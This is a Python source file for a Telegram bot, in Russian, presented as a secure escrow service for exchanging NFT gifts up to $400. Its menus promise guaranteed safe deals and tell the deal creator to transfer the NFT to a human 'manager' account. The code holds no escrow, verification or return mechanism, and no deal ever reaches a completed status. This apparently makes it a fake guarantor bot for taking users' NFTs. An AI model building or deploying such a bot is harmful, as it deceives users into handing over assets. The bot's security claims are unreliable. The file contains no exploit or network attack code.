import logging
import uuid
import os
from datetime import datetime
from dotenv import load_dotenv

# Загружаем .env
load_dotenv()

# Настройки из .env
API_TOKEN = os.getenv('BOT_TOKEN')
ADMIN_ID = int(os.getenv('ADMIN_ID', '174415647'))
SUPPORT_USERNAME = os.getenv('SUPPORT_USERNAME', 'GiftExchangersSupport')
MANAGER_USERNAME = os.getenv('MANAGER_USERNAME', 'GiftExchangersManager')
BOT_USERNAME = os.getenv('BOT_USERNAME', 'GiftExchangersBot')

# Проверка токена
if not API_TOKEN:
    raise ValueError("Нет токена! Проверь файл .env")

from aiogram import Bot, Dispatcher, types
from aiogram.contrib.middlewares.logging import LoggingMiddleware
from aiogram.utils import executor
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.contrib.fsm_storage.memory import MemoryStorage

# Инициализация
bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())
logging.basicConfig(level=logging.INFO)

# Хранилища данных
deals = {}
top_deals = []

# Состояния
class DealStates(StatesGroup):
    waiting_for_nft_name = State()
    waiting_for_amount = State()

class AdminStates(StatesGroup):
    waiting_for_broadcast = State()

# Клавиатуры
def main_keyboard():
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(
        KeyboardButton("📝 Создать сделку"),
        KeyboardButton("ℹ️ Информация")
    )
    keyboard.add(
        KeyboardButton("❓ Как проходит сделка"),
        KeyboardButton("📞 Техподдержка")
    )
    keyboard.add(
        KeyboardButton("🏆 Топ-15 обменов")
    )
    return keyboard

def info_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("❓ Как происходит сделка?", callback_data="how_deal"),
        InlineKeyboardButton("🏠 В главное меню", callback_data="main_menu")
    )
    return keyboard

def admin_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    keyboard.add(
        InlineKeyboardButton("📊 Статистика", callback_data="admin_stats"),
        InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast"),
        InlineKeyboardButton("📋 Все сделки", callback_data="admin_deals"),
        InlineKeyboardButton("❌ Закрыть", callback_data="admin_close")
    )
    return keyboard

# Обработчики команд
@dp.message_handler(commands=['start'])
async def start_command(message: types.Message):
    user = message.from_user
    welcome_text = f"""
👋 Добро пожаловать, {user.first_name}!

🤖 Я бот для безопасного обмена NFT подарками в Telegram.

Выберите действие в меню ниже:
    """
    await message.answer(welcome_text, reply_markup=main_keyboard())

@dp.message_handler(lambda message: message.text == "ℹ️ Информация")
async def info_command(message: types.Message):
    info_text = """
📤 Наш проект создан для безопасного обмена NFT подарками среди пользователей Telegram'a.

➕ В чем плюсы нашего проекта?
• Быстрые, качественные и безопасные обмены!
• Техническая поддержка 24/7
• Гарантия безопасности каждой сделки
• Конфиденциальность данных
• Интуитивно понятный интерфейс

📞 Техническая поддержка: @GiftExchangersManager

🤝 Желаем отличных обменов!
    """
    await message.answer(info_text, reply_markup=info_keyboard())

@dp.message_handler(lambda message: message.text == "❓ Как проходит сделка")
async def how_deal_command(message: types.Message):
    deal_text = """
❓ Как проходит сделка в Off Trade?

• Продавец и покупатель обговаривают условия сделки 🤝

• Один участник сделки создаёт сделку через меню бота 🎁

• Второй участник сделки принимает сделку по чеку 📤

• После того как 2 человека присоединились к сделке, первый участник передаёт NFT менеджеру - @GiftExchangersManager 💰

• После передачи подарка, техподдержка одобряет получение NFT

• Вторая сторона передаёт NFT покупателю

• Менеджер передаёт NFT первому участнику

• Сделка завершена успешно! ✅
    """
    
    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("🏠 В главное меню", callback_data="main_menu")
    )
    await message.answer(deal_text, reply_markup=keyboard)

@dp.message_handler(lambda message: message.text == "📞 Техподдержка")
async def support_command(message: types.Message):
    support_text = f"""
📞 Связаться с технической поддержкой:

👤 Менеджер: @{MANAGER_USERNAME}
👤 Поддержка: @{SUPPORT_USERNAME}

Напишите им в личные сообщения для получения помощи!
    """
    await message.answer(support_text, reply_markup=main_keyboard())

@dp.message_handler(lambda message: message.text == "🏆 Топ-15 обменов")
async def top_deals_command(message: types.Message):
    if not top_deals:
        await message.answer("🏆 Топ-15 обменов пока пуст. Будьте первыми!")
        return
    
    top_text = "🏆 ТОП-15 ЛУЧШИХ ОБМЕНОВ (до $400)\n\n"
    for i, deal in enumerate(sorted(top_deals, key=lambda x: x['amount'], reverse=True)[:15], 1):
        top_text += f"{i}. {deal['nft_name']} — ${deal['amount']}\n"
    
    await message.answer(top_text)

@dp.message_handler(lambda message: message.text == "📝 Создать сделку")
async def create_deal_start(message: types.Message):
    await message.answer("Введите название NFT, которую хотите обменять:")
    await DealStates.waiting_for_nft_name.set()

@dp.message_handler(state=DealStates.waiting_for_nft_name)
async def process_nft_name(message: types.Message, state: FSMContext):
    async with state.proxy() as data:
        data['nft_name'] = message.text
    
    await message.answer("Введите сумму сделки в USD (до $400):")
    await DealStates.waiting_for_amount.set()

@dp.message_handler(state=DealStates.waiting_for_amount)
async def process_amount(message: types.Message, state: FSMContext):
    try:
        amount = float(message.text)
        if amount > 400:
            await message.answer("❌ Сумма не может превышать $400. Введите сумму до $400:")
            return
        
        async with state.proxy() as data:
            data['amount'] = amount
        
        # Создание чека сделки
        deal_id = str(uuid.uuid4())[:8]
        deals[deal_id] = {
            'creator_id': message.from_user.id,
            'creator_name': message.from_user.full_name,
            'creator_username': message.from_user.username,
            'nft_name': data['nft_name'],
            'amount': amount,
            'status': 'waiting',
            'created_at': datetime.now().strftime("%Y-%m-%d %H:%M"),
            'participant_id': None
        }
        
        deal_text = f"""
✅ СДЕЛКА СОЗДАНА!

🆔 Номер сделки: `{deal_id}`
👤 Создатель: @{message.from_user.username}
🎁 NFT: {data['nft_name']}
💰 Сумма: ${amount}

📤 Отправьте этот номер второму участнику для присоединения к сделке.
        """
        
        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("✅ Принять сделку", callback_data=f"accept_deal_{deal_id}"),
            InlineKeyboardButton("❌ Отменить", callback_data=f"cancel_deal_{deal_id}")
        )
        
        # Отправляем создателю
        await message.answer(deal_text, parse_mode="Markdown")
        
        # Отправляем сообщение с кнопками для принятия
        await message.answer("🔗 Ссылка для второго участника:", reply_markup=keyboard)
        
        await state.finish()
        
    except ValueError:
        await message.answer("❌ Пожалуйста, введите число (например: 150)")

@dp.callback_query_handler(lambda c: c.data.startswith('accept_deal_'))
async def accept_deal(callback_query: types.CallbackQuery):
    deal_id = callback_query.data.replace('accept_deal_', '')
    
    if deal_id not in deals:
        await callback_query.answer("❌ Сделка не найдена!")
        return
    
    deal = deals[deal_id]
    
    if deal['status'] != 'waiting':
        await callback_query.answer("❌ Эта сделка уже недоступна!")
        return
    
    if callback_query.from_user.id == deal['creator_id']:
        await callback_query.answer("❌ Вы не можете принять свою сделку!")
        return
    
    deal['participant_id'] = callback_query.from_user.id
    deal['participant_name'] = callback_query.from_user.full_name
    deal['participant_username'] = callback_query.from_user.username
    deal['status'] = 'in_progress'
    
    # Уведомление создателю
    await bot.send_message(
        deal['creator_id'],
        f"✅ @{callback_query.from_user.username} принял вашу сделку #{deal_id}!\n\n"
        f"Теперь передайте NFT менеджеру @{MANAGER_USERNAME}"
    )
    
    await callback_query.message.edit_text(
        f"✅ Вы приняли сделку #{deal_id}\n\n"
        f"Ожидайте, когда создатель передаст NFT менеджеру."
    )
    
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data.startswith('cancel_deal_'))
async def cancel_deal(callback_query: types.CallbackQuery):
    deal_id = callback_query.data.replace('cancel_deal_', '')
    
    if deal_id not in deals:
        await callback_query.answer("❌ Сделка не найдена!")
        return
    
    deal = deals[deal_id]
    
    if callback_query.from_user.id != deal['creator_id']:
        await callback_query.answer("❌ Вы не можете отменить эту сделку!")
        return
    
    deals[deal_id]['status'] = 'cancelled'
    await callback_query.message.edit_text(f"❌ Сделка #{deal_id} отменена.")
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "how_deal")
async def how_deal_callback(callback_query: types.CallbackQuery):
    await how_deal_command(callback_query.message)
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "main_menu")
async def main_menu_callback(callback_query: types.CallbackQuery):
    await callback_query.message.delete()
    await start_command(callback_query.message)
    await callback_query.answer()

# Админ-панель
@dp.message_handler(commands=['admin'])
async def admin_panel(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ У вас нет доступа к админ-панели!")
        return
    
    await message.answer("👨‍💼 Панель администратора:", reply_markup=admin_keyboard())

@dp.callback_query_handler(lambda c: c.data == "admin_stats")
async def admin_stats(callback_query: types.CallbackQuery):
    if callback_query.from_user.id != ADMIN_ID:
        await callback_query.answer("❌ Нет доступа!")
        return
    
    total_deals = len(deals)
    completed_deals = len([d for d in deals.values() if d['status'] == 'completed'])
    active_deals = len([d for d in deals.values() if d['status'] == 'in_progress'])
    
    stats_text = f"""
📊 СТАТИСТИКА:

📌 Всего сделок: {total_deals}
✅ Завершено: {completed_deals}
🔄 Активных: {active_deals}
🏆 В топ-15: {len(top_deals)}
    """
    
    await callback_query.message.edit_text(stats_text, reply_markup=admin_keyboard())
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "admin_deals")
async def admin_deals(callback_query: types.CallbackQuery):
    if callback_query.from_user.id != ADMIN_ID:
        await callback_query.answer("❌ Нет доступа!")
        return
    
    if not deals:
        await callback_query.message.edit_text("📭 Нет активных сделок.", reply_markup=admin_keyboard())
        return
    
    deals_text = "📋 АКТИВНЫЕ СДЕЛКИ:\n\n"
    for deal_id, deal in deals.items():
        deals_text += f"🆔 {deal_id}\n"
        deals_text += f"👤 Создатель: @{deal.get('creator_username', 'None')}\n"
        deals_text += f"🎁 NFT: {deal['nft_name']}\n"
        deals_text += f"💰 ${deal['amount']}\n"
        deals_text += f"📊 Статус: {deal['status']}\n"
        deals_text += "—" * 20 + "\n"
    
    await callback_query.message.edit_text(deals_text[:4000], reply_markup=admin_keyboard())
    await callback_query.answer()

@dp.callback_query_handler(lambda c: c.data == "admin_broadcast")
async def admin_broadcast(callback_query: types.CallbackQuery, state: FSMContext):
    if callback_query.from_user.id != ADMIN_ID:
        await callback_query.answer("❌ Нет доступа!")
        return
    
    await callback_query.message.edit_text(
        "📢 Введите текст для рассылки всем пользователям:"
    )
    await AdminStates.waiting_for_broadcast.set()
    await callback_query.answer()

@dp.message_handler(state=AdminStates.waiting_for_broadcast)
async def process_broadcast(message: types.Message, state: FSMContext):
    if message.from_user.id != ADMIN_ID:
        await message.answer("❌ Нет доступа!")
        return
    
    broadcast_text = message.text
    
    users = set()
    for deal in deals.values():
        users.add(deal['creator_id'])
        if deal.get('participant_id'):
            users.add(deal['participant_id'])
    
    sent = 0
    failed = 0
    
    await message.answer(f"📢 Начинаю рассылку {len(users)} пользователям...")
    
    for user_id in users:
        try:
            await bot.send_message(
                user_id,
                f"📢 РАССЫЛКА ОТ АДМИНИСТРАЦИИ:\n\n{broadcast_text}"
            )
            sent += 1
        except:
            failed += 1
    
    await message.answer(f"✅ Рассылка завершена!\n📨 Отправлено: {sent}\n❌ Не доставлено: {failed}")
    await state.finish()

@dp.callback_query_handler(lambda c: c.data == "admin_close")
async def admin_close(callback_query: types.CallbackQuery):
    if callback_query.from_user.id != ADMIN_ID:
        await callback_query.answer("❌ Нет доступа!")
        return
    
    await callback_query.message.delete()
    await callback_query.answer()

# Запуск
if __name__ == '__main__':
    print("🚀 Бот запущен...")
    print(f"🤖 Токен: {API_TOKEN[:10]}...")
    print(f"👑 Админ ID: {ADMIN_ID}")
    executor.start_polling(dp, skip_updates=True)
